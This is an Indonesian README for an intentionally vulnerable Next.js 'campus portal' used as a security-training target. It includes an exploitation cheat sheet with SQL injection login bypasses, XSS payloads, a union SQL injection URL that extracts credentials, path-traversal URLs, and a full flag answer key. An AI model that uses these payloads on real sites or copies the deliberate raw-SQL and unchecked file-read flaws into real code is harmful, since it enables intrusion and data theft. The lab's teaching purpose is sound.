# 🏛️ Portal Informasi Akademik - Teknik Informatika (Next.js Edition)

Aplikasi web target pengujian keamanan siber (*Vulnerable Web App*) berbasis **Next.js 15 (App Router)** yang dirancang dengan antarmuka **website kampus/portal normal yang bersih dan profesional** (*Portal Berita, Layanan Akademik, dan Manajemen Laboratorium Teknik Informatika*).

Aplikasi ini siap di-deploy secara instan ke **Vercel** dengan **Zero-Configuration** (didukung *embedded in-memory database engine* sehingga tidak wajib memiliki server MySQL terpisah, namun tetap mendukung koneksi MySQL eksternal jika diinginkan).

---

## 📂 Struktur Berkas Proyek

```text
pentes/
├── app/
│   ├── layout.jsx               # Layout utama (topbar, navbar, dan footer)
│   ├── page.jsx                 # Beranda portal (berita terkini & diagnostic widget)
│   ├── globals.css              # Stylesheet bertema portal akademik
│   ├── login/
│   │   └── page.jsx             # Halaman portal login (rentan SQL Injection)
│   ├── dashboard/
│   │   ├── page.jsx             # Dashboard pengguna (menampilkan FLAG utama)
│   │   └── logout-button.jsx    # Tombol keluar sesi
│   ├── search/
│   │   └── page.jsx             # Pencarian berita (rentan Reflected XSS & Union SQLi)
│   ├── view/
│   │   └── page.jsx             # Pusat dokumen (rentan Local File Inclusion / LFI)
│   └── api/
│       ├── auth/
│       │   ├── login/route.js   # API login yang mengeksekusi raw SQL query
│       │   ├── logout/route.js  # API logout
│       │   └── me/route.js      # API pengecekan sesi cookie
│       ├── posts/route.js       # API pencarian berita (rentan Union SQLi)
│       └── view/route.js        # API pembaca berkas (rentan Path Traversal)
├── lib/
│   ├── db.js                    # Dual Database Layer (Remote MySQL + Embedded SQLite)
│   └── session.js               # Manajemen sesi berbasis HTTP-only cookie
├── public/
│   ├── robots.txt               # Berkas robots untuk latihan fuzzing / discovery
│   ├── backup-config.txt        # Berkas cadangan developer yang terekspos
│   ├── secret-notes.txt         # Memo rahasia admin berisi flag LFI
│   ├── database.sql             # Dump SQL (untuk import jika menggunakan MySQL)
│   └── docs/
│       ├── panduan_layanan.txt  # Berkas standar operasional akademik
│       ├── tentang_kami.txt     # Berkas profil visi & misi jurusan
│       └── standar_laboratorium.txt # Berkas tata tertib laboratorium
├── php-version/                 # Arsip versi PHP Native (InfinityFree) terdahulu
├── next.config.mjs              # Konfigurasi custom HTTP headers (X-Lab-Version)
├── jsconfig.json                # Konfigurasi path alias (@/*)
├── package.json                 # Dependensi & skrip Next.js
└── README.md                    # Dokumentasi lengkap & panduan praktikum
```

---

## 🚀 Panduan Deployment ke Vercel

### Cara 1: Deploy via GitHub & Vercel Dashboard (Paling Mudah)

1. **Inisialisasi Git & Push ke GitHub**:
   Buka terminal di folder proyek ini (`e:\Project\pentes`):
   ```bash
   git init
   git add .
   git commit -m "feat: initial commit portal ti nextjs"
   git branch -M main
   git remote add origin https://github.com/USERNAME_ANDA/portal-akademik-ti.git
   git push -u origin main
   ```

2. **Deploy di Vercel**:
   - Kunjungi [https://vercel.com](https://vercel.com) dan login menggunakan akun GitHub Anda.
   - Klik tombol **Add New...** &rarr; pilih **Project**.
   - Pilih repositori `portal-akademik-ti` yang baru saja Anda push, lalu klik **Import**.
   - Vercel akan otomatis mengenali framework **Next.js**.
   - *(Opsional)* Jika ingin menghubungkan ke database MySQL eksternal (misal di TiDB Cloud, Aiven, atau cPanel hosting), masukkan variabel lingkungan di menu **Environment Variables**:
     - `MYSQL_HOST`
     - `MYSQL_USER`
     - `MYSQL_PASSWORD`
     - `MYSQL_DATABASE`
     - `MYSQL_PORT` *(default: 3306)*
   - Jika **tidak** diisi, aplikasi akan otomatis menggunakan **Embedded Engine (Zero-Config)** yang langsung bekerja tanpa setup database eksternal!
   - Klik tombol **Deploy**.
   - Dalam ~1 menit, aplikasi web Anda aktif di domain publik gratis: `https://portal-akademik-ti.vercel.app`.

---

### Cara 2: Deploy Langsung via Vercel CLI

1. Pastikan Vercel CLI terpasang di komputer Anda:
   ```bash
   npm install -g vercel
   ```
2. Jalankan perintah deploy di folder proyek:
   ```bash
   vercel
   ```
   Ikuti instruksi interaktif di terminal (pilih scope akun, link to existing project: No, project name: `portal-akademik-ti`).
3. Untuk deployment ke production:
   ```bash
   vercel --prod
   ```

---

## 💻 Menjalankan di Komputer Lokal

Jika ingin menjalankan aplikasi secara lokal di laptop:

```bash
# 1. Masuk ke direktori proyek
cd e:\Project\pentes

# 2. Pasang dependensi (jika belum)
npm install

# 3. Jalankan development server
npm run dev

# Buka http://localhost:3000 di browser Anda.
```

---

## 🎯 Panduan & Kunci Eksploitasi Praktikum (Cheat Sheet)

### 1. HTTP Service Discovery & Banner Grabbing
Server Next.js telah dikonfigurasi melalui `next.config.mjs` untuk mengirimkan custom header respons:
```bash
# Banner Grabbing dengan cURL
curl -I https://portal-akademik-ti.vercel.app/

# Service & Version Detection dengan Nmap
nmap -sV -sC -p 80,443 portal-akademik-ti.vercel.app
```
**Temuan Header Respons**:
- `X-Lab-Version: VulnLab-PHP/1.2`
- `X-Target-Server: NPT-Lab-Teknik-Informatika`
- `X-Powered-By: Next.js`

---

### 2. Information Disclosure & Enumerasi File
Fuzzing direktori web menggunakan Gobuster atau Dirsearch:
```bash
gobuster dir -u https://portal-akademik-ti.vercel.app/ -w /usr/share/wordlists/dirb/common.txt -x txt,json,sql
```
**Temuan**:
- `https://portal-akademik-ti.vercel.app/robots.txt`
  &rarr; **Flag 1:** `FLAG{Robots_Txt_Discovery_Success_8841}`
- `https://portal-akademik-ti.vercel.app/backup-config.txt`
  &rarr; **Flag 2:** `FLAG{Sensitive_Backup_File_Exposed_4492}`

---

### 3. SQL Injection Authentication Bypass (Portal Masuk)
Portal login pada halaman `/login` memproses query autentikasi:
`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`

**Langkah Eksploitasi**:
1. Buka `https://portal-akademik-ti.vercel.app/login`.
2. Pada kolom **ID Pengguna / Username**:
   - `' OR '1'='1`
   - atau `admin' -- `
3. Kolom **Kata Sandi**: *(kosongkan atau isi sembarang)*.
4. Klik **Masuk ke Akun**.
5. Sistem berhasil melewati otentikasi dan mengarahkan ke `/dashboard`.
6. **Flag 3:** `FLAG{SQL_Injection_Success}`

---

### 4. Reflected XSS & Union-based SQL Injection (Pencarian Berita)
Halaman `/search` memiliki dua kerentanan:

#### A. Reflected Cross-Site Scripting (XSS)
Parameter `?q=` direfleksikan ke dalam DOM tanpa sanitasi HTML menggunakan `dangerouslySetInnerHTML`:
- **PoC XSS**:
  ```text
  https://portal-akademik-ti.vercel.app/search?q=<script>alert('FLAG{Reflected_XSS_Success}')</script>
  ```
- **PoC Alternatif**:
  ```text
  https://portal-akademik-ti.vercel.app/search?q=<img+src=x+onerror=alert('XSS-NPT')>
  ```

#### B. Union-based SQL Injection
Tabel `posts` mengembalikan 5 kolom `(id, title, category, content, author)`:
- **PoC Eksfiltrasi Data Tabel Users**:
  ```text
  https://portal-akademik-ti.vercel.app/search?q=test%27+UNION+SELECT+1%2C+username%2C+role%2C+flag%2C+password+FROM+users+--+
  ```
  Data akun, password, dan token seluruh pengguna akan tampil menyerupai kartu artikel berita!

---

### 5. Local File Inclusion & Path Traversal (Pusat Dokumen)
Halaman `/view` memproses parameter `?page=` menggunakan `fs.readFile()` tanpa validasi `path.basename()` atau whitelist:

**A. Membaca Memo Rahasia Administrator**:
```text
https://portal-akademik-ti.vercel.app/view?page=public/secret-notes.txt
```
**Flag 4:** `FLAG{Local_File_Inclusion_Bypass_Master_1029}`

**B. Membaca Berkas Konfigurasi Cadangan**:
```text
https://portal-akademik-ti.vercel.app/view?page=public/backup-config.txt
```

**C. Path Traversal Membaca Konfigurasi Proyek**:
```text
https://portal-akademik-ti.vercel.app/view?page=package.json
```

---

## 🚩 Rekapitulasi Seluruh String FLAG

| No | Modul Tantangan | Lokasi / File Target | String FLAG |
|---|---|---|---|
| 1 | Web Content Enumeration | `/robots.txt` | `FLAG{Robots_Txt_Discovery_Success_8841}` |
| 2 | Sensitive File Exposure | `/backup-config.txt` | `FLAG{Sensitive_Backup_File_Exposed_4492}` |
| 3 | SQL Injection Login Bypass | `/login` &rarr; `/dashboard` | `FLAG{SQL_Injection_Success}` |
| 4 | SQLi Admin Data Exfil | Tabel `users` (id=1) | `FLAG{SQLi_Admin_Access_Unlocked_7731}` |
| 5 | Reflected XSS | `/search?q=...` | `FLAG{Reflected_XSS_Success}` |
| 6 | Local File Inclusion (LFI) | `/view?page=public/secret-notes.txt` | `FLAG{Local_File_Inclusion_Bypass_Master_1029}` |

---

## ⚖️ Disclaimer
Aplikasi ini dikembangkan semata-mata untuk tujuan riset, edukasi, dan praktikum keamanan siber di lingkungan laboratorium akademik terkontrol.
